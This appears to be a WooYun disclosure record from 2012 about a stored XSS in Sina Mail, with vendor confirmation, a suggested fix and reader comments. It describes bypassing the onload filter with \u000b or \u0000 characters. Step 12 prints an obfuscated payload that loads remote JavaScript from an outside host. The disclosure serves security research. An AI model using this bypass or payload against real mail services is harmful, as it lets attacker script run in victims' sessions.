{"id": 19355, "wybug_id": "wooyun-2012-07244", "wybug_title": "新浪邮箱正文存储型XSS，空字节不仅能上传，还能跨站", "wybug_corp": "新浪", "wybug_author": "gainover", "wybug_date": "2012-05-17 15:14", "wybug_open_date": "2012-07-01 15:15", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "黑盒", "技巧", "安全限制绕过", "黑名单策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-05-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-01：\t细节向公众公开  简要描述： 说到00这个东西，大家最熟悉的应该是上传截断，%00之类的。 00 通常表示字符串结束， 在C里是\\0， JS里通常写为\\u0000。 关于\\0在XSS的应用，好像不算是很多吧，比较有名的 xss list（http://ha.ckers.org/xss.html）里对此也只有几个比较古老版本浏览器（IE6，NS啥的）的应用。这里我发现在IE7，IE9 （没IE8的机器）中都可以使用\\u0000来绕过一些正则，此外本文还发现另外一个特殊的字符，可以绕过某些正则的过滤。在详细说明中会提到。这里我就用这个技巧，绕过了新浪邮箱里的过滤，成功实现XSS。 PS：感谢粽子同学对此测试的帮助。 详细说明：  1. 其实这个过程是最基本的思路，写入以下HTML内容<img src='http://www.wooyun.org/logo/CNVDlogo.jpg' onload='alert(1)'>2. 不出意外, onload='alert(1)'被过滤掉了。3. 继续测试过滤方式，输入以下代码<img src='http://www.wooyun.org/logo/CNVDlogo.jpg' onload/='alert(1)'> 4. 看输出 onload\\/='alert(1)' 这个可以说明：新浪不是直接replace掉 onload之类的字符，5. 经过测试onload空白符=alert('1') 一样会被过滤，可以推出：大概的正则是 onload\\s+=任意连续字符 被过滤为空6. 根据以上测试结果，我们可以构建一个挑战性的模型如下:onload某个不是空白的字符=alert('1')  7. 构建一个测试页面： 见（http://xssreport.sinaapp.com/toolmao.com/sinamail.htm）测试内容主要为 <img src=图片 onload某个字符=alert(某个字符ASCII) />如果弹出了某个字符，就说明这个字符加在onload后面不影响onload=alert()的运行8. 测试结果中比较意外的有2个，IE9支持0， IE7和IE9都支持11：浏览器 onload*=alert 测试结果IE9:  0,32,13,12,11,10,9IE8:  没机器测试IE7: 32,13,12,11,10,9,FF: 32,13,10,9Chrome:32,9,13,10,1210. 除了0之外， 这个11 （16进制\\u000b）确实挺陌生的，9，10，12，13，都是相对常见的。11. 既然如此，我们测试 \\u0000 ，和 \\u000b12. 由于抓包工具，没办法比较直接的发送这类字符，自己写了个工具发送了一下。POST的内容大概如下，这里只列出最关键的msgtxt字段：\n\"msgtxt\":\"<img src='http://www.wooyun.org/logo/CNVDlogo.jpg' onload\\u000b='-function(){var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(47,47,97,112,112,109,97,107,101,114,46,115,105,110,97,97,112,112,46,99,111,109,47,109,46,106,115);document.body.appendChild(s);}()'></img>\",\n13. 由于\\u0000仅在IE9下有效，这里我用\\u000b绕过。 效果见漏洞证明！14. 这里还得说一下，\\u0000 甚至可以写为xxx.innerHTML=\"<img on\\u0000load='alert(1)'>\" 一样可以运行～   漏洞证明：  测试分别在WIN7+IE9， vista+IE7, XP+IE7进行，均成功！WIN7+IE9\n\nXP+IE7\n\n占用乌云一点点存储空间， 俺简陋的工具，也出来露露脸吧！！\n\n   修复方案：  过滤\\u0000 与\\u000b   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-05-17 16:39 厂商回复： 非常感谢gainover的详尽挖掘和分析，我们尽快修复并查找类似问题 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-17 15:24 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  修正下简要描述里的内容，打错了：IE9可以\\u0000，IE7下不行，IE8未测试。IE9，IE7均可使用另外一个字符，IE8未测试。    \n     2012-05-17 15:26 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  膜拜，牛B，暴走了么，亲    \n     2012-05-17 15:31 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @一刀终情 听说新浪送妹子～～  有动力    \n     2012-05-17 15:32 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  @gainover 又是sina，我无语了。    \n     2012-05-17 15:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  god like!    \n     2012-05-17 15:34 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @wanglaojiu 产品都是慢慢变安全的，不然俺们也没存在的意义了，哈哈    \n     2012-05-17 15:41 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  @gainover 也是哦，几乎每次伴随着服务器的升级都有新的洞子出现，难道是程序员更新换代太频繁。    \n     2012-05-17 15:54 |    \t\tlivers \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:6        | mov esp,0jmp espcrash.....)\t\t \n  @gainover EOT 还是ETX 美女    \n     2012-05-17 16:02 |    \t\tFUck \t\t\t( 普通白帽子  |\t\t\t        Rank:293 漏洞数:68        | the quieter you become the more you are ...)\t\t \n  @xsser  Legendary.     \n     2012-05-17 16:10 |    \t\t歌颂 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:5        | #1024)\t\t \n  mark大牛的足迹    \n     2012-05-17 16:26 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  sina骗我原来有妹纸。。。我要妹纸。。 不要娃娃    \n     2012-05-17 16:30 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我是来拜膜猫哥的、    \n     2012-05-17 17:20 |    \t\t小博 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 一个关注与信息安全 程序开发的IT程序员)\t\t \n  sina还有啥漏洞    \n     2012-05-17 17:24 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  @小博 可以自己去尝试抓几个，sina邮件正文处的确实不多。    \n     2012-05-29 12:00 |    \t\tkamikaze \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | xss)\t\t \n  @gainover sina邮箱正文的xss漏洞很多，主要是过滤机制（黑名单+删除）本身就不完善    \n     2012-06-16 19:51 |    \t\tpfdz \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:13        | Stay hungry. Stay foolish.)\t\t \n  学习了，膜拜下。。    \n     2012-07-01 15:42 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  xss帝，正如大风所说的无傻瓜式工具，导致没有普及，所以大牛你再点引爆这场战争吧    \n     2012-07-01 15:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @also on the way!    \n     2012-07-01 18:50 |    \t\ticefish \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:8        | 欢迎大家和我用邮件进行交流~)\t\t \n  good job    \n     2012-07-01 21:10 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  我第一个想的是........gmail可以不  = =  不过目测肯定是绕不过去的    \n     2012-07-02 09:00 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  。。    \n     2012-09-22 21:59 |    \t\twhoami \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:4        | alert\\\\)\t\t \n  拜膜gainover 今天遇到一个 利用此办法绕过了。    \n     2012-09-28 17:51 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  IE8:32,13,12,11,10,9,0    \n     2013-01-16 00:17 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  哈，这个方法收了，下次也试着绕下。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}